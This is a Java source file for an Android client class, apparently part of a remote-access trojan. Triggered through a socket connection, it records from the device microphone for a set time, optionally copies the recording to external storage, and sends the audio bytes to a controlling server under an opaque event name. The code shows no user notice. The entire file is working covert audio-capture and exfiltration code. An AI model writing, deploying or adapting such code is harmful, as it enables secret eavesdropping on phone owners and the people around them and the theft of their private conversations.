package com.example.client;

import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

import io.socket.client.Socket;

public class AudioRecorder {
    private static final String TAG = "AudioRecorder";
    private static MediaRecorder recorder;
    private static File audioFile;
    private static Timer timer;

    public static void startRecording(final int seconds, final boolean saveLocal, final Socket socket) {
        try {
            // Create a temporary file in the app's cache directory
            File cacheDir = ClientApplication.getInstance().getCacheDir();
            audioFile = File.createTempFile("recording", ".mp3", cacheDir);

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            Log.d(TAG, "Recording started for " + seconds + " seconds");

            timer = new Timer();
            timer.schedule(new TimerTask() {
                @Override
                public void run() {
                    try {
                        recorder.stop();
                        recorder.release();
                        recorder = null;
                        Log.d(TAG, "Recording stopped");
                        sendVoice(socket, audioFile, saveLocal);
                        audioFile.delete();
                    } catch (Exception e) {
                        Log.e(TAG, "Error stopping recorder", e);
                    }
                }
            }, seconds * 1000);
        } catch (IOException e) {
            Log.e(TAG, "Recording error", e);
        }
    }

    private static void sendVoice(Socket socket, File file, boolean saveLocal) {
        try {
            int size = (int) file.length();
            byte[] data = new byte[size];
            BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file));
            bis.read(data, 0, data.length);
            bis.close();

            // If requested, save a local copy to external storage (e.g. /sdcard/Audio)
            if (saveLocal) {
                File destDir = new File(Environment.getExternalStorageDirectory(), "Audio");
                if (!destDir.exists()) {
                    destDir.mkdirs();
                }
                File destFile = new File(destDir, file.getName());
                FileOutputStream fos = new FileOutputStream(destFile);
                fos.write(data);
                fos.flush();
                fos.close();
                Log.d(TAG, "Saved audio locally at: " + destFile.getAbsolutePath());
            }

            // Prepare JSON and send the audio data to the server
            JSONObject object = new JSONObject();
            object.put("file", true);
            object.put("name", file.getName());
            object.put("buffer", data);
            socket.emit("x0000mc", object);
            Log.d(TAG, "Audio data sent to server");
        } catch (Exception e) {
            Log.e(TAG, "Error sending audio", e);
        }
    }
}
